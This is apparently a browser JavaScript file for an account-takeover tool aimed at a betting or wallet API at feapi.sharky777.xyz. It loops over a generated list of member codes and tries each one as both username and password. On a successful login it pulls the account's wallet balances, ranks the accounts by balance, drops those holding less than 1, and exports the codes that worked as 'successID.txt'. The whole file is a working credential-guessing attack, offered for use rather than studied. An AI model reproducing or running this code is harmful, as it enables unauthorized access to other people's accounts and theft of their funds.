document.addEventListener('DOMContentLoaded', () => {
    const downloadButton = document.getElementById('downloadButton');
    downloadButton.textContent = 'Download';
    downloadButton.onclick = downloadMemberCodes;
});

let stopFetching = false;

function stopFetchAndDisplayData() {
    stopFetching = true;
    console.log('Fetching process stopped.');
}

async function fetchAndDisplayData() {
    stopFetching = false;
    try {
        const wordListElement = document.getElementById('wordList');
        const membercodes = Array.from(wordListElement.querySelectorAll('li')).map(li => li.textContent);

        if (membercodes.length === 0) {
            console.error('No membercodes found in the generated word list');
            alert('No membercodes found in the generated word list');
            return;
        }

        for (const membercode of membercodes) {
            if (stopFetching) {
                console.log('Fetching process interrupted.');
                break;
            }

            console.log(`Processing membercode: ${membercode}`);

            // Fetch token
            const tokenResponse = await fetch('https://feapi.sharky777.xyz/api/token', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    membercode: membercode,
                    password: membercode,
                    platform: "desktop",
                    option: "2",
                    domain: "https://hckrxyzz.github.io"
                })
            });

            if (!tokenResponse.ok) {
                console.error(`Failed to fetch token for membercode: ${membercode}`);
                continue; // Skip to the next membercode
            }

            let tokenData;
            try {
                tokenData = await tokenResponse.json();
            } catch (error) {
                console.error(`Invalid JSON response for membercode: ${membercode}`, error);
                continue;
            }

            const authToken = tokenData.access_token;

            // Fetch member details
            const dataResponse = await fetch('https://feapi.sharky777.xyz/api/member/details', {
                method: 'GET',
                headers: {
                    'Authorization': `Bearer ${authToken}`
                }
            });

            if (!dataResponse.ok) {
                console.error(`Failed to fetch data for membercode: ${membercode}`);
                continue; // Skip to the next membercode
            }

            let jsonData;
            try {
                jsonData = await dataResponse.json();
            } catch (error) {
                console.error(`Invalid JSON response for membercode: ${membercode}`, error);
                continue;
            }

            populateTable(jsonData);
        }

        console.log('Finished processing all membercodes.');
        alert('Finished processing all membercodes.');
    } catch (error) {
        console.error('Error fetching data:', error);
    }
}

function populateTable(data) {
    const tableBody = document.getElementById('table-body');
    const wallets = data.data.wallets;

    const fragment = document.createDocumentFragment();

    wallets.forEach(wallet => {
        const row = document.createElement('tr');

        const memberCodeCell = document.createElement('td');
        memberCodeCell.textContent = data.data.membercode;
        row.appendChild(memberCodeCell);

        const balanceCell = document.createElement('td');
        balanceCell.textContent = wallet.balance.toFixed(2);
        row.appendChild(balanceCell);

        const siteNameCell = document.createElement('td');
        siteNameCell.textContent = wallet.localization[0].en;
        row.appendChild(siteNameCell);

        const detailsCell = document.createElement('td');
        const detailsButton = document.createElement('button');
        detailsButton.textContent = 'Details';
        detailsButton.className = 'w3-btn w3-red';
        detailsCell.appendChild(detailsButton);
        row.appendChild(detailsCell);

        fragment.appendChild(row);
    });

    tableBody.appendChild(fragment);
}

function sortTableByBalance() {
    const table = document.getElementById('table-body');
    const rows = Array.from(table.rows);

    rows.sort((a, b) => {
        const balanceA = parseFloat(a.cells[1].innerText) || 0;
        const balanceB = parseFloat(b.cells[1].innerText) || 0;

        return balanceB - balanceA;
    });

    rows.forEach(row => table.appendChild(row)); // Reorder rows in the table
}

function removeRowsWithLowBalance() {
    const table = document.getElementById('table-body');
    const rows = Array.from(table.rows);

    rows.forEach(row => {
        const balance = parseFloat(row.cells[1].innerText) || 0;
        if (balance < 1) {
            table.removeChild(row);
        }
    });
}

function formatBalances() {
    const table = document.getElementById('table-body');
    const rows = Array.from(table.rows);

    rows.forEach(row => {
        const balanceCell = row.cells[1];
        const balance = parseFloat(balanceCell.innerText) || 0;
        balanceCell.innerText = balance.toFixed(2);
    });
}

function downloadMemberCodes() {
    const wordListElement = document.getElementById('wordList');
    const membercodes = Array.from(wordListElement.querySelectorAll('li')).map(li => li.textContent).join('\n');
    const blob = new Blob([membercodes], { type: 'text/plain' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = 'successID.txt';
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
    URL.revokeObjectURL(url);
}
